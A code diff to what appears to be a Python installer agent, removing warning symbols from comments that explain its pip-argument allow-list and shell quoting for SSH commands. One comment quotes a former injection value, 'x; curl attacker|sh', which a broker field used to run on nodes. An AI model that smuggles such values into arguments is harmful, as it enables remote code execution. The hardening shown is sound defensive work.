@@ -50,7 +50,7 @@ _PACKAGE_NAME = re.compile(
 def is_installable_name(package: str) -> bool:
     """Whether `package` is a package name and not an instruction to pip.
 
-    ⚠ Two different exposures, one answer.
+    Two different exposures, one answer.
 
     Locally the command is built as a *list*, so there is no shell — but pip
     reads its own options from positional arguments, so `--index-url=http://…`
@@ -590,7 +590,7 @@ class InstallerAgent(Actor):
             # report success for a request that was not carried out.
             return {"error": f"Not package names: {', '.join(refused)}"}
 
-        # ⚠ Two guards, because neither covers the other. `shlex.quote` stops
+        # Two guards, because neither covers the other. `shlex.quote` stops
         # the value being read as *shell* syntax once this string reaches SSH;
         # the allow-list above stops it being read as *pip options*, which a
         # correctly quoted `--index-url=…` still would be.
@@ -753,7 +753,7 @@ class InstallerAgent(Actor):
                 await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")
 
                 # 6. Start runner using venv python in the background
-                # ⚠ Every interpolated value is quoted. `broker` comes straight
+                # Every interpolated value is quoted. `broker` comes straight
                 # off the task payload with no validation, so `--broker` used to
                 # accept `x; curl attacker|sh` and run it on the node. `node_name`
                 # is checked by `deploy_name_error`, but that only forbids the
